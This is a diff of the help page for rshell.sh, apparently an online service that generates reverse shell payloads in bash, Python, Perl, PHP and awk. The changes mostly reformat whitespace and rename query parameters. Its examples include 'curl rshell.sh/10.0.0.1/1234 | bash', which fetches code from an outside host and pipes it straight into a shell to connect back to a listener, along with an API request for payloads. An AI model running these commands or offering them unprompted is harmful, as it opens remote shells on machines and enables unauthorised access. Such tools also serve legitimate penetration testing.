@@ -1,71 +1,71 @@
 
-		rshell.sh - Help Page
+        rshell.sh - Help Page
 
-	Reverse Shell Payload Microservice
+    Reverse Shell Payload Microservice
 
 * Python Shell Reset
 
-	curl -s rshell.sh/reset
+    curl -s rshell.sh/reset
 
 * Supported Languages
 
-	- bash
-	- python (3)
-	- perl
-	- pHP
-	- awk
+    - bash
+    - python (3)
+    - perl
+    - pHP
+    - awk
 
 * Supported Shells
 
-	- bash
-	- csh
-	- ksh
-	- zsh
+    - bash
+    - csh
+    - ksh
+    - zsh
 
 * GET Parameter(s)
 
-	- Example: Quote Wrapped
-		rshell.sh/10.0.0.1/1234?q=y	
+    - Example: Quote Wrapped
+        rshell.sh/10.0.0.1/1234?quotes=single
 
-	- Description:
-		Output wrapped in single quotes.
+    - Description:
+        Output wrapped in single or double quotes.
 
 
-	- Example: Shell Selection
-		rshell.sh/python/10.0.0.1/1234?s=zsh
+    - Example: Shell Selection
+        rshell.sh/python/10.0.0.1/1234?shell=zsh
 
-	- Description:
-		Type of reverse shell that is sent.
+    - Description:
+        Type of reverse shell that is sent.
 
 
 * API Options
 
-	- host:
-		IPv4_ADDRESS
+    - host:
+        IPv4_ADDRESS
 
-	- port:
-		PORT_NUMBER
+    - port:
+        PORT_NUMBER
 
-	- lang:
-		See, Supported Languages
+    - lang:
+        See, Supported Languages
 
-	- shell:
-		See, Supported Shells
+    - shell:
+        See, Supported Shells
 
 * Examples
 
-	- Basic Usage:
-		curl rshell.sh/10.0.0.1/1234 | bash
+    - Basic Usage:
+        curl rshell.sh/10.0.0.1/1234 | bash
 
-	- Passing GET Parameters:
-		curl rshell.sh/python/10.0.0.1/1234?q=y&s=zsh
+    - Passing GET Parameters:
+        curl rshell.sh/10.0.0.1/1234?quotes=single&shell=zsh
 
-	- API:
-		curl -sd '{"host":"10.0.0.1", "port":1234, "lang":"python", "shell":"zsh"}' -H "Content-Type: application/json" -X POST  https://rshell.sh/api
+    - API:
+        curl -sd '{"host":"10.0.0.1", "port":1234, "lang":"python", "shell":"zsh"}' -H "Content-Type: application/json" -X POST  https://rshell.sh/api
 
 * Links
 
-	- Live Site: https://rshell.sh
-	- Github: https://github.com/BlueSquare23/Rshell.sh
+    - Live Site: https://rshell.sh
+    - Github: https://github.com/BlueSquare23/Rshell.sh
 
 
